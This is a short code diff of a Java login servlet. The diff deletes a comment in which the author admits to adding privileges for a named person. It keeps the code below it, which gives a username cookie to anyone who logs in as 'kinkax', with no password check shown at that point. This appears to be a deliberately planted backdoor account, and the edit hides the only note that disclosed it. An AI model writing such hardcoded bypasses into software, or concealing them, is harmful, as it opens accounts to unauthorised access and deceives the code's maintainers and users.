@@ -28,8 +28,7 @@ public class LoginServlet extends HttpServlet {
 
         String name=request.getParameter("username");  
         String password=request.getParameter("password"); 
-         /*Adding Some priveleges for our kinkyass brother :-)
-        Hehe. Just to prove him wrong there's this extra line*/
+        
         if(name.equals("kinkax")){
             Cookie cookey = new Cookie("username",name);  
             response.addCookie(cookey); 
